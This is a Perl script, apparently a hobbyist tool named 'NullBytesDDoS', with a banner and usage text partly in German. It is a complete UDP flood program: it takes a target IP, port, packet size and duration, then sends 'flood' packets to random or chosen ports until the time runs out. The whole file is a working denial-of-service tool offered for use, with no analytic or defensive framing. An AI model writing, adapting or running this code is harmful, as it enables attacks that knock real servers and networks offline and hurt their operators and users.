#!/usr/bin/perl

# Script by #NullBytesAlpha
use Socket;
use strict;
print <<EOTEXT;
_____ _ _ _____ _ ____ ____ _____ _____
| | |_ _| | | __ |_ _| |_ ___ ___| \| \| | __|
| | | | | | | __ -| | | _| -_|_ -| | || | | | |__ |
|_|___|___|_|_|_____|_ |_| |___|___|____/|____/|_____|_____|
|___|
EOTEXT
if ($#ARGV != 3) {
print " \n";
print " - * NullBytesDDoS // by NullBytes\n\n";
print " - * Order: flood.pl <IP-address> <Port> <Packets> <Time (In seconds)>\n";
print " - * Port: Port to flood. Set to 0 for all.\n";
print " - * Packets: The number of packets to send. Between 64 and 1024.\n";
print " - * Time: Flood time in seconds.\n";
print " - * ";
exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Es konnte keine Verbindung hergestellt werden mit $ip !\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print "$ip wird nun geddost Port:" . ($port ? $port : "random") . " mit " .
($size ? "$size-byte" : "random size") . " paketen" .
($time ? " Noch $time Sekunden" : "") . "\n";
print "Abbrechen mit Ctrl + C\n" unless $time;

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1500-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}